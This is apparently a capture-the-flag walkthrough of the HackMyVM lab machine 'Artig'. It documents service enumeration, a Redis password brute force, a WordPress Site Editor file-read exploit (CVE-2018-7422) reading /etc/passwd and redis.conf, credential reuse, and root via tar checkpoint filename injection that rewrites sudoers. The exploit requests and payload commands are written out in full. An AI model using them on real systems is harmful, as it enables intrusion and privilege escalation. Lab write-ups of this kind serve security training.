# Artig

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Artig | Analogman | Beginner | HackMyVM |

**Summary:** The compromise started with broad service enumeration that exposed anonymous FTP, Redis with password authentication, and a WordPress site running a vulnerable site editor plugin. Anonymous FTP disclosed an operational note that hinted at ongoing plugin testing and restricted SSH access, which redirected effort toward the web stack and local services. After virtual host resolution, plugin enumeration confirmed CVE 2018 7422 in Site Editor, and local file inclusion through the vulnerable AJAX endpoint enabled direct reads of sensitive files from the server. Pulling Redis configuration revealed an internal warning to user Mario about a weak Redis password, which enabled credential reuse against FTP as mario, then recovery of shell history and path intelligence. Further FTP access to the WordPress directory exposed a backup copy of the WordPress configuration containing database credentials reused by user max for SSH authentication. Once inside as max, sudo permissions allowed execution of bash as www data, and this bridged into a writable web root where a tar checkpoint injection primitive could be planted against a root owned backup workflow. That chain rewrote sudoers for max, granted full passwordless sudo, and ended with root shell access and retrieval of both user and root flags.

## Recon

1. I identified the target host on the local subnet and performed full TCP service enumeration.

```powershell
PS D:\hackmyvm\machines> D:\CTF_Tools\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.176 08:00:27:AD:30:59 VirtualBox
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/artig]
└─$ ip=192.168.100.176 && url=http://$ip

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/artig]
└─$ nmap -sC -sV -p- $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-02 19:56 WIB
Nmap scan report for 192.168.100.176
Host is up (0.0035s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.100.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-rw-r--    1 1000     1000          649 Apr 10 19:39 note.txt
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7+deb13u2 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.66 ((Debian))
|_http-title: Hello World!
|_http-generator: WordPress 6.9.4
|_http-server-header: Apache/2.4.66 (Debian)
6379/tcp open  redis   Redis key-value store
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.92 seconds
```

2. I accessed anonymous FTP and extracted the operational note.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/artig]
└─$ ftp $ip
Connected to 192.168.100.176.
220 (vsFTPd 3.0.5)
Name (192.168.100.176:ouba): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||47394|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        105          4096 Apr 10 19:39 .
drwxr-xr-x    2 0        105          4096 Apr 10 19:39 ..
-rw-rw-r--    1 1000     1000          649 Apr 10 19:39 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||19558|)
150 Opening BINARY mode data connection for note.txt (649 bytes).
100% |*********************************************|   649      230.55 KiB/s    00:00 ETA
226 Transfer complete.
649 bytes received in 00:00 (135.91 KiB/s)
ftp> bye
221 Goodbye.

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/artig]
└─$ cat note.txt
Hello team,

Max here - the new sysadmin. After a quick analysis of the system, I’ve noticed a few inconsistencies left by the previous admin, particularly around some core services and their conf files. For now, I’d prefer not to touch anything too sensitive until I have a clearer picture.

I’m currently testing a site editor plugin a colleague recommended. The homepage is still empty while I sort things out, but it should be up soon.

For the time being, SSH access has been restricted to admin accounts only.

Please be patient, and apologies for any inconvenience. I’m working as quickly as possible to get everything back in order.
```

3. I tested Redis authentication and confirmed a weak password but no immediate high value data inside Redis itself.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/artig]
└─$ hydra -P /usr/share/wordlists/rockyou.txt redis://192.168.100.176
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-02 20:03:57
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking redis://192.168.100.176:6379/
[6379][redis] host: 192.168.100.176   password: w[REDACTED]
[STATUS] attack finished for 192.168.100.176 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-02 20:04:20
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/artig]
└─$ redis-cli -h 192.168.100.176 -a w[REDACTED]
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
192.168.100.176:6379> PING
PONG
```

4. I moved to web exploitation, resolved the virtual host, and enumerated WordPress in depth.

![](image.png)

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/artig]
└─$ echo '192.168.100.176 artig.hvm' | sudo tee -a /etc/hosts
[sudo] password for ouba:
192.168.100.176 artig.hvm
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/artig]
└─$ wpscan --url http://artig.hvm --api-token ... --enumerate vp,vt,tt,cb,dbe,u --plugins-detection aggressive --force --random-user-agent                        _______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://artig.hvm/ [192.168.100.176]
[+] Started: Sat May  2 20:26:39 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.66 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://artig.hvm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://artig.hvm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://artig.hvm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.9.4 identified (Latest, released on 2026-03-11).
 | Found By: Rss Generator (Passive Detection)
 |  - http://artig.hvm/index.php/feed/, <generator>https://wordpress.org/?v=6.9.4</generator>
 |  - http://artig.hvm/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.9.4</generator>

[+] WordPress theme in use: twentytwentyfive
 | Location: http://artig.hvm/wp-content/themes/twentytwentyfive/
 | Latest Version: 1.4 (up to date)
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://artig.hvm/wp-content/themes/twentytwentyfive/readme.txt
 | Style URL: http://artig.hvm/wp-content/themes/twentytwentyfive/style.css
 | Style Name: Twenty Twenty-Five
 | Style URI: https://wordpress.org/themes/twentytwentyfive/
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://artig.hvm/wp-content/themes/twentytwentyfive/style.css, Match: 'Version: 1.4'

[+] Enumerating Vulnerable Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:00:27 <===================> (7343 / 7343) 100.00% Time: 00:00:27
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://artig.hvm/wp-content/plugins/akismet/
 | Latest Version: 5.7
 | Last Updated: 2026-04-23T22:34:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://artig.hvm/wp-content/plugins/akismet/, status: 403
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 3.1.5
 |     References:
 |      - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357
 |      - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
 |      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
 |
 | The version could not be determined.

[+] site-editor
 | Location: http://artig.hvm/wp-content/plugins/site-editor/
 | Last Updated: 2017-05-02T23:34:00.000Z
 | Readme: http://artig.hvm/wp-content/plugins/site-editor/readme.txt
 | [!] The version is out of date, the latest version is 1.1.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://artig.hvm/wp-content/plugins/site-editor/, status: 200
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Site Editor <= 1.1.1 - Local File Inclusion (LFI)
 |     References:
 |      - https://wpscan.com/vulnerability/4432ecea-2b01-4d5c-9557-352042a57e44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7422
 |      - https://seclists.org/fulldisclosure/2018/Mar/40
 |      - https://github.com/SiteEditor/editor/issues/2
 |
 | Version: 1.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://artig.hvm/wp-content/plugins/site-editor/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://artig.hvm/wp-content/plugins/site-editor/readme.txt

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:01 <=====================> (652 / 652) 100.00% Time: 00:00:01
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:05 <===================> (2575 / 2575) 100.00% Time: 00:00:05

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <======================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:00 <============================> (75 / 75) 100.00% Time: 00:00:00

[i] No DB Exports Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=======================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] max
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://artig.hvm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 5
 | Requests Remaining: 20

[+] Finished: Sat May  2 20:27:32 2026
[+] Requests Done: 10853
[+] Cached Requests: 13
[+] Data Sent: 3.289 MB
[+] Data Received: 1.779 MB
[+] Memory used: 267.09 MB
[+] Elapsed time: 00:00:53
```

## Initial Access

1. I validated **CVE-2018-7422** in the Site Editor plugin and confirmed arbitrary file read with the public PoC request pattern documented at `https://seclists.org/fulldisclosure/2018/Mar/40`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/artig]
└─$ curl -s http://artig.hvm/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon:/usr/lib/dhcpcd:/bin/false
systemd-timesync:x:991:991:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:990:990:System Message Bus:/nonexistent:/usr/sbin/nologin
sshd:x:989:65534:sshd user:/run/sshd:/usr/sbin/nologin
max:x:1000:1000:max,,,:/home/max:/bin/bash
mysql:x:101:103:MariaDB Server:/nonexistent:/bin/false
ftp:x:102:105:ftp daemon:/srv/ftp:/usr/sbin/nologin
redis:x:103:106::/var/lib/redis:/usr/sbin/nologin
mario:x:1001:1001:,,,:/home/mario:/bin/bash
{"success":true,"data":{"output":[]}}
```

2. I used the same file read primitive against Redis configuration and extracted a direct hint about Mario password hygiene.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/artig]
└─$ curl -s "http://artig.hvm/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/redis/redis.conf" | grep Mario
# Dear Mario, this is Max. The password you put here for the Redis server it's too weak and anyone can guess it. Please change it!
```

3. I reused the recovered Redis credential for mario on FTP, then pulled `.bash_history` to confirm account activity and paths.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/artig]
└─$ ftp $ip
Connected to 192.168.100.176.
220 (vsFTPd 3.0.5)
Name (192.168.100.176:ouba): mario
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||64468|)
150 Here comes the directory listing.
drwx------    3 1001     1001         4096 Apr 10 23:23 .
drwxr-xr-x    4 0        0            4096 Apr 10 23:10 ..
-rw-------    1 1001     1001          225 Apr 10 23:24 .bash_history
-rw-r--r--    1 1001     1001          220 Apr 10 23:10 .bash_logout
-rw-r--r--    1 1001     1001         3526 Apr 10 23:10 .bashrc
-rw-r--r--    1 1001     1001          807 Apr 10 23:10 .profile
drwxrwxr-x    2 1001     1001         4096 Apr 10 23:22 .ssh
226 Directory send OK.
ftp> get .bash_history
local: .bash_history remote: .bash_history
229 Entering Extended Passive Mode (|||36313|)
150 Opening BINARY mode data connection for .bash_history (225 bytes).
100% |***************************************************************************|   225        1.63 MiB/s    00:00 ETA
226 Transfer complete.
225 bytes received in 00:00 (100.97 KiB/s)
ftp> exit
221 Goodbye.
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/artig]
└─$ cat .bash_history
cd
ls
ls -al
mkdir .ssh
cd .ssh/
ls
ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa
ls -al
cat id_rsa
cd ..
id
sudo -l
cd ..
cd var
cd www
cd html
ls a-l
ls -al
get
cd
exit
cd
ls -al
cd /var/www/html/
ls
ls a-l
ls -al
cd
ls
exit
```

4. I returned to FTP as mario, navigated into the WordPress directory, and downloaded the backup configuration.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/artig]
└─$ ftp $ip
Connected to 192.168.100.176.
220 (vsFTPd 3.0.5)
Name (192.168.100.176:ouba): mario
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd /var/www/html
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||54104|)
150 Here comes the directory listing.
drwxr-xr-x    5 33       33           4096 May 02 12:38 .
drwxr-xr-x    3 0        0            4096 May 02 12:38 ..
-rw-r--r--    1 33       33            542 Apr 10 19:18 .htaccess
-rwxr-xr-x    1 33       33            405 Feb 06  2020 index.php
-rwxr-xr-x    1 33       33          19903 Mar 06  2025 license.txt
-rwxr-xr-x    1 33       33           7425 Jul 08  2025 readme.html
-rwxr-xr-x    1 33       33           7349 Oct 07  2025 wp-activate.php
drwxr-xr-x    9 33       33           4096 Mar 11 10:28 wp-admin
-rwxr-xr-x    1 33       33            351 Feb 06  2020 wp-blog-header.php
-rwxr-xr-x    1 33       33           2323 Jun 14  2023 wp-comments-post.php
-rwxr-xr-x    1 1000     1000         3326 Apr 10 23:13 wp-configg.php.bak
drwxr-xr-x    6 33       33           4096 Apr 10 23:18 wp-content
-rwxr-xr-x    1 33       33           5617 Aug 02  2024 wp-cron.php
drwxr-xr-x   31 33       33          12288 Mar 11 10:28 wp-includes
-rwxr-xr-x    1 33       33           2493 Apr 30  2025 wp-links-opml.php
-rwxr-xr-x    1 33       33           3937 Mar 11  2024 wp-load.php
-rwxr-xr-x    1 33       33          51437 Oct 29  2025 wp-login.php
-rwxr-xr-x    1 33       33           8727 Apr 02  2025 wp-mail.php
-rwxr-xr-x    1 33       33          31055 Nov 07 08:42 wp-settings.php
-rwxr-xr-x    1 33       33          34516 Mar 10  2025 wp-signup.php
-rwxr-xr-x    1 33       33           5214 Aug 19  2025 wp-trackback.php
-rwxr-xr-x    1 33       33           3205 Nov 08  2024 xmlrpc.php
226 Directory send OK.
ftp> get wp-configg.php.bak
local: wp-configg.php.bak remote: wp-configg.php.bak
229 Entering Extended Passive Mode (|||53424|)
150 Opening BINARY mode data connection for wp-configg.php.bak (3326 bytes).
100% |***************************************************************************|  3326        1.89 MiB/s    00:00 ETA
226 Transfer complete.
3326 bytes received in 00:00 (859.04 KiB/s)
ftp> exit
221 Goodbye.
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/artig]
└─$ cat wp-configg.php.bak
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wpmaxadmin' );

/** Database password */
define( 'DB_PASSWORD', 'm92[REDACTED]' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

5. I reused the recovered password for SSH login as max and captured the user flag.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/artig]
└─$ ssh max@192.168.100.176
max@192.168.100.176's password:
Linux Artig 6.12.74+deb13+1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.74-2 (2026-03-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Apr 11 20:25:10 2026 from 192.168.1.5
max@Artig:~$ id
uid=1000(max) gid=1000(max) groups=1000(max),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev)
max@Artig:~$ ls -la
total 28
drwx------ 3 max  max  4096 Apr 11 20:35 .
drwxr-xr-x 4 root root 4096 Apr 10 23:10 ..
lrwxrwxrwx 1 max  max     9 Apr 10 23:47 .bash_history -> /dev/null
-rw-r--r-- 1 max  max   220 Apr 10 12:51 .bash_logout
-rw-r--r-- 1 max  max  3526 Apr 10 12:51 .bashrc
drwxrwxr-x 3 max  max  4096 Apr 10 23:46 .local
-rw-r--r-- 1 max  max   807 Apr 10 12:51 .profile
-rw-rw-r-- 1 max  max    32 Apr 11 20:35 user.txt
```

## Privilege Escalation

1. I enumerated sudo permissions and discovered that max can run `/bin/bash` as `www data` without password.

```bash
max@Artig:~$ sudo -l
Matching Defaults entries for max on Artig:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User max may run the following commands on Artig:
    (www-data) NOPASSWD: /bin/bash
```

2. I reviewed backup logic and validated that tar runs against the web root, creating an injection surface with crafted checkpoint filenames.

```bash
max@Artig:~$ ls -la /opt/
total 12
drwxr-xr-x  2 root root 4096 Apr 10 23:19 .
drwxr-xr-x 18 root root 4096 Apr 11 20:40 ..
-rwxr-----  1 root max   136 Apr 10 23:19 backup.sh
max@Artig:~$ cat /opt/backup.sh
#!/bin/bash

BACKUP_DIR="/root"
TARGET="/var/www/html"

mkdir -p $BACKUP_DIR

cd $TARGET
tar -czf $BACKUP_DIR/wordpress_backup.tar.gz *
```

```bash
max@Artig:~$ cd /var/www/html
max@Artig:/var/www/html$ ls -la
total 248
drwxr-xr-x  5 www-data www-data  4096 Apr 11 20:39 .
drwxr-xr-x  3 root     root      4096 Apr 10 19:03 ..
-rw-r--r--  1 www-data www-data   542 Apr 10 19:18 .htaccess
-rwxr-xr-x  1 www-data www-data   405 Feb  6  2020 index.php
-rwxr-xr-x  1 www-data www-data 19903 Mar  6  2025 license.txt
-rwxr-xr-x  1 www-data www-data  7425 Jul  8  2025 readme.html
-rwxr-xr-x  1 www-data www-data  7349 Oct  7  2025 wp-activate.php
drwxr-xr-x  9 www-data www-data  4096 Mar 11 10:28 wp-admin
-rwxr-xr-x  1 www-data www-data   351 Feb  6  2020 wp-blog-header.php
-rwxr-xr-x  1 www-data www-data  2323 Jun 14  2023 wp-comments-post.php
-rwxr-xr-x  1 max      max       3326 Apr 10 23:13 wp-configg.php.bak
-rwxr-xr-x  1 www-data www-data  3326 Apr 10 19:09 wp-config.php
drwxr-xr-x  6 www-data www-data  4096 Apr 10 23:18 wp-content
-rwxr-xr-x  1 www-data www-data  5617 Aug  2  2024 wp-cron.php
drwxr-xr-x 31 www-data www-data 12288 Mar 11 10:28 wp-includes
-rwxr-xr-x  1 www-data www-data  2493 Apr 30  2025 wp-links-opml.php
-rwxr-xr-x  1 www-data www-data  3937 Mar 11  2024 wp-load.php
-rwxr-xr-x  1 www-data www-data 51437 Oct 29  2025 wp-login.php
-rwxr-xr-x  1 www-data www-data  8727 Apr  2  2025 wp-mail.php
-rwxr-xr-x  1 www-data www-data 31055 Nov  7 07:42 wp-settings.php
-rwxr-xr-x  1 www-data www-data 34516 Mar 10  2025 wp-signup.php
-rwxr-xr-x  1 www-data www-data  5214 Aug 19  2025 wp-trackback.php
-rwxr-xr-x  1 www-data www-data  3205 Nov  8  2024 xmlrpc.php
max@Artig:/var/www/html$ sudo -u www-data /bin/bash
www-data@Artig:~/html$
```

3. I wrote a payload that grants max full sudo privileges, planted tar checkpoint trigger files, then waited for the root backup execution path to process them.

```bash
www-data@Artig:~/html$ cat << EOF > shell.sh && chmod 777 shell.sh
> #!/bin/bash
> echo "max ALL=(ALL:ALL) NOPASSWD:ALL" > /etc/sudoers.d/max
> chmod 0440 /etc/sudoers.d/max
> EOF
www-data@Artig:~/html$ cat shell.sh
#!/bin/bash
echo "max ALL=(ALL:ALL) NOPASSWD:ALL" > /etc/sudoers.d/max
chmod 0440 /etc/sudoers.d/max
```

```bash
www-data@Artig:~/html$ touch ./"--checkpoint=1"
www-data@Artig:~/html$ touch ./"--checkpoint-action=exec=sh shell.sh"
www-data@Artig:~/html$ exit
```

4. I confirmed privilege expansion for max and escalated to root, then captured both flags.

```bash
max@Artig:/var/www/html$ sudo -l
Matching Defaults entries for max on Artig:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User max may run the following commands on Artig:
    (www-data) NOPASSWD: /bin/bash
max@Artig:/var/www/html$ sudo -l
Matching Defaults entries for max on Artig:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User max may run the following commands on Artig:
    (www-data) NOPASSWD: /bin/bash
    (ALL : ALL) NOPASSWD: ALL
```

```bash
max@Artig:/var/www/html$ sudo -i
root@Artig:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
Artig
root@Artig:~# cat /home/max/user.txt
HVM{XxW[REDACTED]}
root@Artig:~# cat /root/root.txt
HVM{xXw[REDACTED]}
```

## Attack Chain Summary
1. **Reconnaissance**: Service discovery exposed anonymous FTP, WordPress on Apache, SSH, and an authenticated Redis instance.
2. **Vulnerability Discovery**: WordPress plugin enumeration identified Site Editor version 1.1 vulnerable to **CVE-2018-7422**, then exploitation followed the known PoC endpoint pattern in `ajax_shortcode_pattern.php?ajax_path=`.
3. **Exploitation**: Local file inclusion enabled arbitrary server side file reads, including `/etc/redis/redis.conf`, which disclosed a clue that enabled credential reuse for user mario.
4. **Internal Enumeration**: FTP access as mario enabled retrieval of `.bash_history` and backup WordPress configuration, revealing reusable credentials for max and enabling SSH access.
5. **Privilege Escalation**: Sudo delegation from max to www data plus tar checkpoint injection in a root backup workflow enabled sudoers overwrite and full root compromise.

